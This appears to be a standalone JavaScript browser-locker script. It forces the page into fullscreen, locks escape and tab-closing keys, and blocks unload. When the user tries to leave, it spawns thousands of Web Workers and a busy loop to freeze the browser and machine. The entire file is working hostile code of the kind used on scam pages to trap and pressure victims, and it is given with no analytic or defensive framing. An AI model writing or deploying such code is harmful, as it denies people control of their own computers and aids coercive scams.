const WORKER_COUNT = 4000;

let armed     = false;
let triggered = false;
const workers = [];

const workerURL = `data:application/javascript,
    let sink = 0;
    while (true) {
        for (let i = 0; i < 1000; i++) {
            sink %2B= Math.sqrt(Math.random() * Math.PI) * Math.log(i + 2);
        }
    }
`;

function grind() {
    const end = performance.now() + 500;
    let sink = 0;
    while (performance.now() < end) {
        for (let i = 0; i < 5000; i++) {
            sink += Math.sqrt(Math.random() * Math.PI) * (i | 1);
        }
    }
    if (sink >= 0) setTimeout(grind, 3);
}

function freeze() {
    if (triggered) return;
    triggered = true;
    for (let i = 0; i < WORKER_COUNT; i++) {
        try { workers.push(new Worker(workerURL)); } catch (_) {}
    }
    grind();
}

async function enterFullscreen(element = document.documentElement) {
    await element.requestFullscreen();
    if (navigator.keyboard?.lock) {
        await navigator.keyboard.lock([
            'Escape', 'F11', 'KeyL', 'F6',
            'KeyW', 'KeyT', 'KeyN', 'KeyR', 'Tab',
        ]);
    }
    armed = true;
}

const LOCKED_KEYS = new Set(['Escape', 'F11', 'F6']);

document.addEventListener("keydown", e => {
    if (!armed) return;
    const ctrl  = e.ctrlKey || e.metaKey;
    const shift = e.shiftKey;

    if (LOCKED_KEYS.has(e.code)) { e.preventDefault(); freeze(); return; }
    if (ctrl && ['KeyL','KeyW','KeyT','KeyN'].includes(e.code)) { e.preventDefault(); freeze(); return; }
    if (ctrl && shift && e.code === 'Escape') { e.preventDefault(); freeze(); return; }
    if (ctrl && e.code === 'KeyR') { e.preventDefault(); return; }
}, true);

document.addEventListener("fullscreenchange", () => {
    if (armed && !document.fullscreenElement) freeze();
});

setInterval(() => {
    if (armed && !document.fullscreenElement) freeze();
}, 50);

window.addEventListener("beforeunload", e => {
    if (!armed) return;
    e.preventDefault();
    e.returnValue = "";
});

document.addEventListener("visibilitychange", () => {
    if (armed && document.hidden) freeze();
});

window.addEventListener("blur", () => {
    if (armed) freeze();
});

window.enterFullscreen = enterFullscreen;
